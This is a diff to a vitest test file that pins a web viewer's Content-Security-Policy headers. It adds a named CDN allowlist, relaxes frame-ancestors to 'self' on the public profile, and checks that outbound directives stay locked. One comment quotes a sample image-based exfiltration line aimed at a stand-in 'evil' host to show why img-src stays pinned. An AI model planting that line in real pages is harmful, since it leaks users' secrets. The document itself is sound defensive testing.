@@ -23,16 +23,23 @@
 // negative assertions are what keep the next investigation from "fixing" it
 // the wrong way.
 import { describe, expect, it } from "vitest";
-import { editViewHeaders, viewHeaders } from "./view-headers";
+import { editViewHeaders, VIEW_CSP_ALLOWLIST, viewHeaders } from "./view-headers";
+
+// ADR-0088 (amends ADR-013): the enforcing view CSP is built from the ONE
+// exported `Viewer CSP allowlist` constant, and these tests assert against
+// that constant rather than restating its hosts — a duplicated string here
+// would let the constant and its "specification" drift apart in the same
+// commit, which is precisely what a named allowlist exists to prevent.
+const allow = (hosts: readonly string[]): string => hosts.join(" ");
 
 const ENFORCING_CSP = [
   "default-src 'self'",
-  "script-src 'self' 'unsafe-inline'",
-  "style-src 'self' 'unsafe-inline'",
+  `script-src 'self' 'unsafe-inline' ${allow(VIEW_CSP_ALLOWLIST.scriptSrc)}`,
+  `style-src 'self' 'unsafe-inline' ${allow(VIEW_CSP_ALLOWLIST.styleSrc)}`,
   "img-src 'self' data: blob:",
-  "font-src 'self' data:",
+  `font-src 'self' data: ${allow(VIEW_CSP_ALLOWLIST.fontSrc)}`,
   "connect-src 'self'",
-  "frame-ancestors 'none'",
+  "frame-ancestors 'self'",
   "base-uri 'none'",
   "form-action 'self'",
   "object-src 'none'",
@@ -66,6 +73,109 @@ describe("viewHeaders", () => {
 
   it("pins the report-only CSP (stricter: no 'unsafe-inline' on script/style)", () => {
     expect(viewHeaders().get("Content-Security-Policy-Report-Only")).toBe(REPORT_ONLY_CSP);
+  });
+
+  // ADR-0088: the artifact-parity allowlist. A report published here should
+  // render the way the artifact it was generated as renders — the designed
+  // typeface, the charting library — and these four hosts are what that costs.
+  describe("Viewer CSP allowlist (ADR-0088) — artifact parity, bought at four named hosts", () => {
+    const enforcing = () =>
+      (viewHeaders().get("Content-Security-Policy") ?? "").split(", ")[0] ?? "";
+
+    it("is ONE exported constant, keyed by the directive each host belongs to", () => {
+      // The shape is the contract: adding a host is an edit to this object,
+      // visible in a diff, and reviewable as the security decision it is.
+      expect(Object.keys(VIEW_CSP_ALLOWLIST).sort()).toEqual(["fontSrc", "scriptSrc", "styleSrc"]);
+    });
+
+    it("allows the Google Fonts stylesheet host on style-src — and nothing else new there", () => {
+      expect(VIEW_CSP_ALLOWLIST.styleSrc).toEqual(["https://fonts.googleapis.com"]);
+      expect(enforcing()).toContain(
+        `style-src 'self' 'unsafe-inline' ${allow(VIEW_CSP_ALLOWLIST.styleSrc)};`,
+      );
+    });
+
+    it("allows the Google Fonts file host on font-src — the typeface itself", () => {
+      // Two hosts, not one: googleapis serves the @font-face CSS, gstatic
+      // serves the woff2 it points at. Allowing either alone renders nothing.
+      expect(VIEW_CSP_ALLOWLIST.fontSrc).toEqual(["https://fonts.gstatic.com"]);
+      expect(enforcing()).toContain(`font-src 'self' data: ${allow(VIEW_CSP_ALLOWLIST.fontSrc)};`);
+    });
+
+    it("allows exactly the two pinned script CDNs on script-src — a third is a decision", () => {
+      expect(VIEW_CSP_ALLOWLIST.scriptSrc).toEqual([
+        "https://cdnjs.cloudflare.com",
+        "https://cdn.jsdelivr.net/npm/",
+      ]);
+      expect(enforcing()).toContain(
+        `script-src 'self' 'unsafe-inline' ${allow(VIEW_CSP_ALLOWLIST.scriptSrc)};`,
+      );
+    });
+
+    it("carries no wildcard, no bare scheme, and no plaintext host", () => {
+      // A `https:`, `*` or `data:` entry would turn a named allowlist back
+      // into an open door while still looking like a list.
+      for (const host of Object.values(VIEW_CSP_ALLOWLIST).flat()) {
+        expect(host.startsWith("https://")).toBe(true);
+        expect(host).not.toContain("*");
+        // Shape, not just length: a bare `https://` + one label ("https://x")
+        // cleared the old `length > "https://".length` floor while being no
+        // kind of host at all. Require a dotted host, an optional path, and
+        // no quote character (which would smuggle in a CSP keyword source
+        // like `'unsafe-eval'` past the wildcard check above).
+        expect(host).toMatch(/^https:\/\/[a-z0-9-]+(\.[a-z0-9-]+)+(\/[\w.-]+)*\/?$/);
+        expect(host).not.toContain("'");
+      }
+    });
+
+    it("SECURITY: leaves every OUTBOUND directive pinned — the allowlist loads, it never sends", () => {
+      // This is the whole safety argument of ADR-0088. `connect-src 'self'`
+      // is what keeps exfiltration blocked (spec threat #3); `img-src` stays
+      // pinned because a wildcard image source IS an exfil channel
+      // (`new Image().src = "https://evil/?" + secret`) that defeats
+      // connect-src without ever using connect.
+      const csp = enforcing();
+      expect(csp).toContain("connect-src 'self';");
+      expect(csp).toContain("img-src 'self' data: blob:;");
+      expect(csp).toContain("form-action 'self';");
+      expect(csp).toContain("worker-src 'self';");
+      expect(csp).toContain("object-src 'none';");
+      expect(csp).toContain("base-uri 'none';");
+      for (const host of Object.values(VIEW_CSP_ALLOWLIST).flat()) {
+        expect(csp).not.toContain(`connect-src 'self' ${host}`);
+        expect(csp).not.toContain(`img-src 'self' data: blob: ${host}`);
+      }
+    });
+
+    it("frames only under its own origin — frame-ancestors 'self', never 'none', never a wildcard", () => {
+      // 'self' lets the viewer origin build report-in-a-frame surfaces of its
+      // own; app.<domain> is a DIFFERENT origin and an attacker's page is not
+      // 'self', so clickjacking a report stays impossible.
+      const csp = enforcing();
+      expect(csp).toContain("frame-ancestors 'self';");
+      expect(csp).not.toContain("frame-ancestors 'none'");
+      expect(csp).not.toContain("frame-ancestors *");
+    });
+
+    it("does NOT leak the allowlist into the report-only shadow policy — it stays strict", () => {
+      // The shadow policy is the instrument that tells us what reports reach
+      // for. Widening it too would blind us at the moment we most want to see.
+      const reportOnly = viewHeaders().get("Content-Security-Policy-Report-Only") ?? "";
+      for (const host of Object.values(VIEW_CSP_ALLOWLIST).flat()) {
+        expect(reportOnly).not.toContain(host);
+      }
+      expect(reportOnly).toContain("frame-ancestors 'none'");
+    });
+
+    it("does NOT leak the allowlist into the edit-route profile (ADR-0063, out of scope)", () => {
+      const editCsp =
+        editViewHeaders({ appOrigin: "https://app.example.com" }).get("Content-Security-Policy") ??
+        "";
+      for (const host of Object.values(VIEW_CSP_ALLOWLIST).flat()) {
+        expect(editCsp).not.toContain(host);
+      }
+      expect(editCsp).toContain("frame-ancestors 'none'");
+    });
   });
 
   describe("sandbox CSP token grants — each token named for what it buys", () => {
@@ -367,7 +477,11 @@ describe("editViewHeaders vs viewHeaders — the two profiles differ only in the
     expect(editCsp).not.toContain("sandbox");
   });
 
-  it("the enforcing directive sets differ ONLY in script-src, connect-src, and the new frame-src", () => {
+  it("the enforcing directive sets differ ONLY in the intended directives", () => {
+    // Intended differences: script-src / style-src / font-src (ADR-0088's
+    // allowlist is public-profile-only), connect-src (the edit profile's app
+    // origin), frame-ancestors (ADR-0088 relaxes the PUBLIC profile to 'self';
+    // the edit route stays 'none'), and frame-src (new in the edit profile).
     // The public CSP header carries two appended values (enforcing + sandbox);
     // only the first (enforcing) is the comparable profile.
     const publicEnforcing =
@@ -386,15 +500,37 @@ describe("editViewHeaders vs viewHeaders — the two profiles differ only in the
     const editWithoutFrameSrc = { ...editDirectives };
     delete editWithoutFrameSrc["frame-src"];
 
+    const intentionallyDifferent = new Set([
+      "script-src",
+      "style-src",
+      "font-src",
+      "connect-src",
+      "frame-ancestors",
+    ]);
     for (const key of Object.keys(publicDirectives)) {
-      if (key === "script-src" || key === "connect-src") continue;
+      if (intentionallyDifferent.has(key)) continue;
       expect(editWithoutFrameSrc[key]).toBe(publicDirectives[key]);
     }
 
-    // script-src: the edit profile is STRICTER (drops 'unsafe-inline') —
-    // never looser than the public profile.
-    expect(publicDirectives["script-src"]).toBe("'self' 'unsafe-inline'");
+    // script-src: the edit profile is STRICTER — it drops BOTH 'unsafe-inline'
+    // and the ADR-0088 allowlist. Never looser than the public profile.
+    expect(publicDirectives["script-src"]).toBe(
+      `'self' 'unsafe-inline' ${allow(VIEW_CSP_ALLOWLIST.scriptSrc)}`,
+    );
     expect(editDirectives["script-src"]).toBe("'self'");
+
+    // style-src / font-src: the allowlist is the public profile's alone —
+    // the edit route renders the first-party editor, not a report.
+    expect(publicDirectives["style-src"]).toBe(
+      `'self' 'unsafe-inline' ${allow(VIEW_CSP_ALLOWLIST.styleSrc)}`,
+    );
+    expect(editDirectives["style-src"]).toBe("'self' 'unsafe-inline'");
+    expect(publicDirectives["font-src"]).toBe(`'self' data: ${allow(VIEW_CSP_ALLOWLIST.fontSrc)}`);
+    expect(editDirectives["font-src"]).toBe("'self' data:");
+
+    // frame-ancestors: relaxed to 'self' on the public profile only.
+    expect(publicDirectives["frame-ancestors"]).toBe("'self'");
+    expect(editDirectives["frame-ancestors"]).toBe("'none'");
 
     // connect-src: the edit profile is WIDENED to the app origin, but only
     // by that one explicit origin — never a wildcard.
